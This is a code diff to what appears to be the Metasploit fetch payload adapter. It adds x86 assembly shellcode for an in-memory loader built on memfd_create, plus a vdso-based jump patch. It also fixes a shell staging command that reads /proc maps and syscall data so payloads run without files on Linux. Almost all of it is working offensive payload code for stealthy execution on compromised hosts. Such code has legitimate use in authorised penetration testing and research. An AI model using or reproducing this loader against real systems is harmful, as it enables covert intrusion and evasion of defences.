@@ -236,6 +236,9 @@ module Msf::Payload::Adapter::Fetch
   def _generate_first_stage_shellcode
     case module_info['AdaptedArch']
     when 'x64'
+      # fd = memfd_create()
+      # ftruncate(fd)
+      # pause()
       in_memory_loader_asm = %(
       start:
           xor rsi, rsi
@@ -255,7 +258,21 @@ module Msf::Payload::Adapter::Fetch
       )
       payload = Metasm::Shellcode.assemble(Metasm::X64.new, in_memory_loader_asm).encode_string
     when 'x86'
-      puts 'Not implemented yet'
+      in_memory_loader_asm= %(
+        xor ecx, ecx
+        push ecx
+        lea ebx, [esp]
+        inc ecx
+        mov eax, 0xfffffe9c
+        neg eax
+        int 0x80
+        mov ebx, eax
+        mov al, 0x5d
+        int 0x80
+        mov al, 0x1d
+        int 0x80
+      )
+      payload = Metasm::Shellcode.assemble(Metasm::X86.new, in_memory_loader_asm).encode_string
     when 'aarch64'
       puts 'Not implemented yet'
     when 'armle'
@@ -281,7 +298,9 @@ module Msf::Payload::Adapter::Fetch
   def _generate_jmp_instruction
     case module_info['AdaptedArch']
     when 'x64'
-      %^48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
+      %^48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0^
+    when 'x86'
+      %^b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0^
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
     end
@@ -291,7 +310,7 @@ module Msf::Payload::Adapter::Fetch
   # New idea: use /proc/*/mem to write shellcode stager into bash process and create anonymous handle on-fly, then search for that handle and use same approach as original idea
   def _generate_fileless(get_file_cmd)
     stage_cmd = %<vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)));>
-    stage_cmd << %(jmp="#{_generate_jmp_instruction};)
+    stage_cmd << %(jmp="#{_generate_jmp_instruction}";)
     stage_cmd << "sc=$(base64 -d <<< #{_generate_first_stage_shellcode});"
     stage_cmd << %<jmp=$(printf $jmp | sed 's/\\([0-9A-F]\\{2\\}\\)/\\\\x\\1/gI');>
     stage_cmd << 'read syscall_info < /proc/self/syscall;'
